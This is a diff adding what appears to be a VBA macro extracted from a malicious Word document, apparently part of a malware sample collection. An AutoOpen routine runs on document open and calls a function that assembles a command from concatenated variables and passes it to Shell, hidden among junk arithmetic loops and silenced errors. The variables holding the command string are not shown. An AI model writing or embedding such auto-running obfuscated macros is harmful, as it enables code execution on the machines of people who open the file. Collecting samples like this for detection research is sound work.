@@ -1,0 +1,36 @@
+Filename     : ./macros/4c28b6327d5fac72f8a9b81db0080c32711a3ce856ccc0070d22fc1156b38e89
+OLE stream   : Macros/VBA/uzFikzFokz
+VBA filename : uzFikzFokz.cls
+----------------------------------------
+Attribute VB_Name = "uzFikzFokz"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Function CzuanXK()
+On Error Resume Next
+For CrRwLO = cjsqS To 52045
+         prTPDR = (mUBTbp - ChrW(20489 * 50293) * ocjwZ * CInt(mfiQvl + Sqr(68530)) + 53105 - 85670 / 22063 - CDate(aMCDs - 3501 + 2495 - Hex(PXPfk / 48146)) + (CfEOj * Tan(MwFolm)))
+Next
+For wDsIH = OwXBv To 50567
+         qJVWAu = (iiEXdc - ChrW(82573 * 28241) * wPHPf * CInt(MiGXc + Sqr(19307)) + 28046 - 58590 / 57808 - CDate(oAmCa - 67324 + 77011 - Hex(unPwVi / 59814)) + (Ahalo * Tan(DhwrP)))
+Next
+CzuanXK = jdjzVI + Shell(MdssPhzH + Chr(oOwFNDK + vbKeyC + UpHHmAj) + NqskEBPiEUI + bldzHzmdwF + WZXtwHS + fqQOUGhwH + UhjvzwfFc + uWkqbdpXSaC + PHqoPBnlvXm, Nkcdz + 0 + mMjvVRTsnDr)
+For ShUEaO = cELpNb To 32271
+         rtOIb = (LJjDsU - ChrW(56515 * 94025) * GiTLY * CInt(TKYHp + Sqr(5882)) + 23118 - 78102 / 85090 - CDate(KXqLn - 65524 + 67850 - Hex(jGXnBi / 87936)) + (fAFGu * Tan(sHYjq)))
+Next
+End Function
+Sub Autoopen()
+On Error Resume Next
+For mpzVo = hzmlQY To 99189
+         bSpfJp = (dXLjl - ChrW(36112 * 91173) * jnEriB * CInt(HCzKBw + Sqr(48647)) + 88420 - 68520 / 62340 - CDate(OnZRs - 48699 + 612 - Hex(IRnlCX / 72700)) + (DzMjR * Tan(hKmjzo)))
+Next
+CzuanXK
+For EdcDi = HFRuf To 83962
+         scTRwn = (iVvXz - ChrW(80313 * 67704) * PfMaL * CInt(EnLiY + Sqr(36623)) + 57795 - 25004 / 72447 - CDate(joXmF - 83639 + 41044 - Hex(MZnihE / 6525)) + (VBqmiF * Tan(XnoHiX)))
+Next
+End Sub
+
